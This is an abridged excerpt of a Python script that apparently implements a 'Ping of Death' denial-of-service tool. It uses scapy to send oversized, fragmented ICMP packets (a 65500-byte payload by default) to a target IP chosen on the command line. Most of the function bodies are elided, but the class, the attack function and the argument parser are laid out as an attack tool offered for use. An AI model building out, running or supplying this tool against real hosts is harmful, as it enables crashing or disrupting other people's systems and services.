...
try:
    from scapy.all import ICMP, IP, conf, fragment, send
except ImportError:
...
class PingOfDeathAttack:
    ...
    def execute(self) -> dict[str, Any]:
        ...
        logger.info(
            f"Parameters: {self.packet_count} packets, {self.payload_size} bytes payload, "
...
def start_ping_of_death_attack(
    target_ip: str,
    packet_count: int = 1,
    payload_size: int = 65500,
    fragment_size: int = 1400,
...
def parse_arguments() -> argparse.Namespace:
    ...
    parser.add_argument(
        "-c", "--count", type=int, default=1, help="Number of packets to send (default: 1)"
    )
